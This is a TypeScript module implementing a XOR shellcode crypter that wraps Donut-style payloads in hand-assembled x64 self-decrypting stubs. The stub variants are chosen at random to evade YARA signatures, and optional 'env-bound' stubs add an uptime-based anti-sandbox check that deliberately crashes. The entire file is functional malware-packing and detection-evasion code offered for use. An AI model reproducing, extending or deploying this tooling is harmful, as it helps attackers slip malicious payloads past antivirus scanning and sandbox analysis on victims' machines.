// Custom XOR shellcode crypter.
//
// Wraps Donut/Linux shellcode with a position-independent x64 decryptor stub
// so the encrypted payload is never present in cleartext until runtime.
//
// Layout of the output blob:
//   [0..N-1]   N-byte x64 decryptor stub (N varies by variant, see buildStub)
//   [N..N+7]   payload_size as uint64 LE (8 bytes)
//   [N+8..N+39] 32-byte XOR key
//   [N+40..]   XOR-encrypted payload
//
// Two equivalent stub variants are generated randomly per build to avoid
// fixed YARA signatures on the entry sequence:
//   Variant A: CALL $+5 / POP RBX / SUB RBX, 5  (55 bytes total)
//   Variant B: LEA RBX, [RIP-7]                 (52 bytes total)

// Variant A: 55 bytes, preamble E8 00 00 00 00 5B 48 83 EB 05
const STUB_A_SIZE = 55;
const STUB_A_BYTES = Buffer.from([
  0xe8, 0x00, 0x00, 0x00, 0x00, // CALL $+5
  0x5b,                         // POP RBX         ; rbx = &byte_5_of_stub
  0x48, 0x83, 0xeb, 0x05,       // SUB RBX, 5      ; rbx = stub_start
  0x48, 0x81, 0xc3, 0x37, 0x00, 0x00, 0x00, // ADD RBX, 55
  0x48, 0x8b, 0x0b,             // MOV RCX, [RBX]
  0x48, 0x8d, 0x73, 0x08,       // LEA RSI, [RBX+8]
  0x48, 0x8d, 0x7b, 0x28,       // LEA RDI, [RBX+40]
  0x31, 0xc0,                   // XOR EAX, EAX
  // loop (offset 30):
  0x48, 0x3b, 0xc1,             // CMP RAX, RCX
  0x73, 0x12,                   // JNB +18 (→ done@53)
  0x89, 0xc2,                   // MOV EDX, EAX
  0x83, 0xe2, 0x1f,             // AND EDX, 0x1F
  0x44, 0x8a, 0x04, 0x16,       // MOV R8B, [RSI+RDX]
  0x44, 0x30, 0x04, 0x07,       // XOR [RDI+RAX], R8B
  0x48, 0xff, 0xc0,             // INC RAX
  0xeb, 0xe9,                   // JMP -23 (→ loop@30)
  // done (offset 53):
  0xff, 0xd7,                   // JMP RDI
]);

// Variant B: 52 bytes, preamble 48 8D 1D F9 FF FF FF (LEA RBX, [RIP-7])
const STUB_B_SIZE = 52;
const STUB_B_BYTES = Buffer.from([
  0x48, 0x8d, 0x1d, 0xf9, 0xff, 0xff, 0xff, // LEA RBX, [RIP-7] → RBX = stub_start
  0x48, 0x81, 0xc3, 0x34, 0x00, 0x00, 0x00, // ADD RBX, 52
  0x48, 0x8b, 0x0b,             // MOV RCX, [RBX]
  0x48, 0x8d, 0x73, 0x08,       // LEA RSI, [RBX+8]
  0x48, 0x8d, 0x7b, 0x28,       // LEA RDI, [RBX+40]
  0x31, 0xc0,                   // XOR EAX, EAX
  // loop (offset 27):
  0x48, 0x3b, 0xc1,             // CMP RAX, RCX
  0x73, 0x12,                   // JNB +18 (→ done@50)
  0x89, 0xc2,                   // MOV EDX, EAX
  0x83, 0xe2, 0x1f,             // AND EDX, 0x1F
  0x44, 0x8a, 0x04, 0x16,       // MOV R8B, [RSI+RDX]
  0x44, 0x30, 0x04, 0x07,       // XOR [RDI+RAX], R8B
  0x48, 0xff, 0xc0,             // INC RAX
  0xeb, 0xe9,                   // JMP -23 (→ loop@27)
  // done (offset 50):
  0xff, 0xd7,                   // JMP RDI
]);

// ENV Variant A: 77 bytes, CALL+POP preamble, randomised uptime threshold.
// Threshold bytes at offsets 22-25: 3D ?? ?? 00 00 (CMP EAX, threshold).
const ENV_STUB_A_SIZE = 77;
const ENV_STUB_A_TEMPLATE = Buffer.from([
  0xe8, 0x00, 0x00, 0x00, 0x00,                   // CALL $+5
  0x5b,                                           // POP RBX
  0x48, 0x83, 0xeb, 0x05,                         // SUB RBX, 5
  0xbf, 0x00, 0x00, 0xfe, 0x7f,                   // MOV EDI, 0x7FFE0000
  0x8b, 0x87, 0x20, 0x03, 0x00, 0x00,             // MOV EAX, [RDI+0x320]
  0x3d, 0x00, 0x10, 0x00, 0x00,                   // CMP EAX, threshold (22-25)
  0x72, 0x2d,                                     // JB crash (+45 → offset 73)
  0x48, 0x81, 0xc3, 0x4d, 0x00, 0x00, 0x00,       // ADD RBX, 77
  0x48, 0x8b, 0x0b,                               // MOV RCX, [RBX]
  0x48, 0x8d, 0x73, 0x08,                         // LEA RSI, [RBX+8]
  0x48, 0x8d, 0x7b, 0x28,                         // LEA RDI, [RBX+40]
  0x31, 0xc0,                                     // XOR EAX, EAX
  // loop (offset 48):
  0x48, 0x3b, 0xc1,                               // CMP RAX, RCX
  0x73, 0x12,                                     // JNB done (+18 → offset 71)
  0x89, 0xc2,                                     // MOV EDX, EAX
  0x83, 0xe2, 0x1f,                               // AND EDX, 0x1F
  0x44, 0x8a, 0x04, 0x16,                         // MOV R8B, [RSI+RDX]
  0x44, 0x30, 0x04, 0x07,                         // XOR [RDI+RAX], R8B
  0x48, 0xff, 0xc0,                               // INC RAX
  0xeb, 0xe9,                                     // JMP loop (-23 → offset 48)
  // done (offset 71):
  0xff, 0xd7,                                     // JMP RDI
  // crash (offset 73):
  0x31, 0xc0,                                     // XOR EAX, EAX
  0xff, 0xe0,                                     // JMP RAX (null deref)
]);

// ENV Variant B: 74 bytes, LEA-based preamble, randomised uptime threshold.
// Threshold bytes at offsets 18-22: 3D ?? ?? 00 00 (CMP EAX, threshold).
const ENV_STUB_B_SIZE = 74;
const ENV_STUB_B_TEMPLATE = Buffer.from([
  0x48, 0x8d, 0x1d, 0xf9, 0xff, 0xff, 0xff,       // LEA RBX, [RIP-7]
  0xbf, 0x00, 0x00, 0xfe, 0x7f,                   // MOV EDI, 0x7FFE0000
  0x8b, 0x87, 0x20, 0x03, 0x00, 0x00,             // MOV EAX, [RDI+0x320]
  0x3d, 0x00, 0x10, 0x00, 0x00,                   // CMP EAX, threshold (18-22)
  0x72, 0x2d,                                     // JB crash (+45 → offset 70)
  0x48, 0x81, 0xc3, 0x4a, 0x00, 0x00, 0x00,       // ADD RBX, 74
  0x48, 0x8b, 0x0b,                               // MOV RCX, [RBX]
  0x48, 0x8d, 0x73, 0x08,                         // LEA RSI, [RBX+8]
  0x48, 0x8d, 0x7b, 0x28,                         // LEA RDI, [RBX+40]
  0x31, 0xc0,                                     // XOR EAX, EAX
  // loop (offset 45):
  0x48, 0x3b, 0xc1,                               // CMP RAX, RCX
  0x73, 0x12,                                     // JNB done (+18 → offset 68)
  0x89, 0xc2,                                     // MOV EDX, EAX
  0x83, 0xe2, 0x1f,                               // AND EDX, 0x1F
  0x44, 0x8a, 0x04, 0x16,                         // MOV R8B, [RSI+RDX]
  0x44, 0x30, 0x04, 0x07,                         // XOR [RDI+RAX], R8B
  0x48, 0xff, 0xc0,                               // INC RAX
  0xeb, 0xe9,                                     // JMP loop (-23 → offset 45)
  // done (offset 68):
  0xff, 0xd7,                                     // JMP RDI
  // crash (offset 70):
  0x31, 0xc0,                                     // XOR EAX, EAX
  0xff, 0xe0,                                     // JMP RAX (null deref)
]);

// Sanity-check pre-assembled templates at module load time.
if (STUB_A_BYTES.length !== STUB_A_SIZE) throw new Error(`BUG: STUB_A length mismatch`);
if (STUB_B_BYTES.length !== STUB_B_SIZE) throw new Error(`BUG: STUB_B length mismatch`);
if (ENV_STUB_A_TEMPLATE.length !== ENV_STUB_A_SIZE) throw new Error(`BUG: ENV_STUB_A length mismatch`);
if (ENV_STUB_B_TEMPLATE.length !== ENV_STUB_B_SIZE) throw new Error(`BUG: ENV_STUB_B length mismatch`);

export interface XorCrypterResult {
  output: Buffer;
  key: Buffer;
}

function xorEncrypt(shellcode: Buffer): { key: Buffer; encrypted: Buffer; sizeBuf: Buffer } {
  const key = Buffer.alloc(32);
  crypto.getRandomValues(new Uint8Array(key.buffer, key.byteOffset, 32));
  const encrypted = Buffer.alloc(shellcode.length);
  for (let i = 0; i < shellcode.length; i++) {
    encrypted[i] = shellcode[i] ^ key[i % 32];
  }
  const sizeBuf = Buffer.alloc(8);
  sizeBuf.writeBigUInt64LE(BigInt(shellcode.length));
  return { key, encrypted, sizeBuf };
}

// Returns a plain decryptor stub (no env check) with randomly-chosen entry sequence.
function buildPlainStub(): Buffer {
  const useB = (crypto.getRandomValues(new Uint8Array(1))[0] & 1) === 1;
  return Buffer.from(useB ? STUB_B_BYTES : STUB_A_BYTES);
}

// Returns an env-bound decryptor stub with randomly-chosen entry sequence and
// randomised uptime threshold in [0x0C00, 0x13FF] (~50–80 s of system uptime).
function buildEnvStub(): Buffer {
  const useB = (crypto.getRandomValues(new Uint8Array(1))[0] & 1) === 1;
  const r16 = new Uint16Array(1);
  crypto.getRandomValues(r16);
  const threshold = 0x0c00 + (r16[0] % 0x0800); // 0x0C00–0x13FF

  const stub = Buffer.from(useB ? ENV_STUB_B_TEMPLATE : ENV_STUB_A_TEMPLATE);
  // CMP EAX, N: 3D [lo] [hi] 00 00 — write 16-bit threshold after the opcode.
  // ENV_STUB_A: 3D at offset 21 → threshold at offset 22.
  // ENV_STUB_B: 3D at offset 18 → threshold at offset 19.
  const thresholdOffset = useB ? 19 : 22;
  stub.writeUInt16LE(threshold, thresholdOffset);
  return stub;
}

/**
 * Wrap shellcode with a plain self-decrypting XOR stub (no env checks).
 * Entry sequence is chosen randomly per call to avoid fixed YARA signatures.
 */
export function wrapXorStub(shellcode: Buffer): XorCrypterResult {
  const { key, encrypted, sizeBuf } = xorEncrypt(shellcode);
  const stub = buildPlainStub();
  const output = Buffer.concat([stub, sizeBuf, key, encrypted]);
  return { output, key };
}

/**
 * Wrap shellcode with an env-bound XOR stub with uptime anti-sandbox gate.
 * Entry sequence and uptime threshold are randomised per call.
 */
export function wrapEnvBoundXorStub(shellcode: Buffer): XorCrypterResult {
  const { key, encrypted, sizeBuf } = xorEncrypt(shellcode);
  const stub = buildEnvStub();
  const output = Buffer.concat([stub, sizeBuf, key, encrypted]);
  return { output, key };
}
